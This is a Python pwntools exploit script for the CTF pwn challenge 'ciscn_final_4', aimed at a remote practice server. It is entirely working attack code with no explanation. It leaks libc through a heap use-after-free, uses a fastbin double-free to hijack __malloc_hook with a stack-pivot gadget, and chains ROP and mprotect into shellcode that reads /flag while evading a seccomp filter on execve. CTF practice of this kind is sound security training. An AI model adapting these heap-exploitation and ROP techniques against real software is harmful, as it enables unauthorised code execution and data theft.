#!/usr/bin/python2.7  
# -*- coding: utf-8 -*-
from pwn import *
context.log_level = "debug"
context.arch = "amd64"

exe = './ciscn_final_4'
elf = ELF(exe)


'''
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x35 0x02 0x00 0x40000000  if (A >= 0x40000000) goto 0004
 0002: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0004
 0003: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0004: 0x06 0x00 0x00 0x00000000  return KILL
 '''

#------------------------------------
def d(s = ''):
    gdb.attach(p ,s)

def manu(idx):
    p.sendlineafter('>> ', str(idx))

def input_name(name):
    p.sendlineafter('name? \n', name)

def add(size, content):
    manu(1)
    p.sendlineafter('size?\n', str(size))
    p.sendafter('content?\n', content)

def show(idx):
    manu(3)
    p.sendlineafter('?\n', str(idx))

def delete(idx):
    manu(2)
    p.sendlineafter('?\n', str(idx))

def pwn(): 
    pop_rdi = 0x401193
    pop_rsi_r15 = 0x401191
    pop_rsp_r13_r14_r15 = 0x40118d
    rop = ROP(elf)

    rop.raw(pop_rdi)
    rop.raw(0)
    rop.raw(pop_rsi_r15)
    rop.raw(elf.bss()+0x200)
    rop.raw(0)
    rop.raw(elf.plt["read"])
    rop.raw(pop_rsp_r13_r14_r15)
    rop.raw(elf.bss()+0x200)
    # rop.raw(0xdeadbeef)

    payload = rop.chain().ljust(0x100)
    input_name(payload[:-1])

    add(0x80, 'cccccccc')
    add(0x10, 'aaaaaaaa')
    delete(0)
    show(0)

    libc.address = u64(p.recv(6).ljust(8,'\x00')) - 0x3c4b78
    success('libc.address--->'+hex(libc.address))

    add(0x70-8, 'AAAA')
    add(0x70-8, 'BBBB')

    delete(2)
    delete(3)
    delete(2)

    pivot_gadget = libc.address + 0x00000000000c96a6 # add rsp, 0x38; ret
    add(0x70-8, p64(libc.sym['__malloc_hook'] - 0x23))
    add(0x60, "junk")
    add(0x60, "junk")
    add(0x60, "a"*19 + p64(pivot_gadget))
   # d()
    
    pop_rdx = libc.address + 0x1b92

    rop1 = ROP(elf)
    rop1.raw(pop_rdx)
    rop1.raw(0x100)
    rop1.raw(elf.plt['read'])

    manu(1)  
    #d()
    p.sendlineafter('size?','1')

    p.send("a"*0x18 + rop1.chain())

    rop2 = ROP(elf)
    rop2.raw(pop_rdi)
    rop2.raw(0x602000)
    rop2.raw(pop_rsi_r15)
    rop2.raw(0x1000)
    rop2.raw(0)
    rop2.raw(pop_rdx)
    rop2.raw(7)
    rop2.raw(libc.symbols['mprotect'])
    rop2.raw(0x6022a0)

    payload = rop2.chain() +"AAAAAAAA"+ asm(shellcraft.linux.openat(0x70, "/flag", 0) + shellcraft.linux.read(3, elf.bss()+0x200, 0x30) + shellcraft.linux.write(1, elf.bss()+0x200, 0x30))
    print hex(len(payload))

    p.send(cyclic(48) + payload)
    # d()
    p.interactive()
#-------------------------------------
if __name__ == '__main__':
    l = 0
    if l:
        p = process(exe)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    else:
        p = remote('node3.buuoj.cn',28270)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

    pwn()